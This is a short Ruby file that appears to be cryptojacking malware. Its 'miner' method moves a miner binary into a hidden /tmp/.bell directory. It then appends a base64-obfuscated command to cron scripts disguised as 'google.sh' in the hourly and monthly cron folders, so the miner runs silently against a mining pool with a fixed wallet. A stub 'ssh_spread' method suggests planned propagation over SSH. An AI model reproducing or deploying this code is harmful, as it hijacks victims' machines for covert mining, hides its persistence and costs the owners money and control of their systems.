require 'net/http'
require 'uri'
require 'base64'
require 'resolv'
require'fileutils'
require 'open3'
require 'rbconfig'
class Linux
  def self.miner
    if File.directory?("/tmp/.bell")
    	FileUtils.rm_rf("/tmp/.bell")
    end
    FileUtils.mkdir_p("/tmp/.bell")
    dir = File.dirname(__FILE__)
    FileUtils.mv("#{dir}/rvwf_miner", '/tmp/.bell')
    f = File.open("/etc/cron.monthly/google.sh", "a")
    f << Base64.decode64("bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=")
    f = File.open("/etc/cron.hourly/google.sh", "a")
    f << Base64.decode64("bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=")
  end
  def self.ssh_spread
  	puts
  end
end
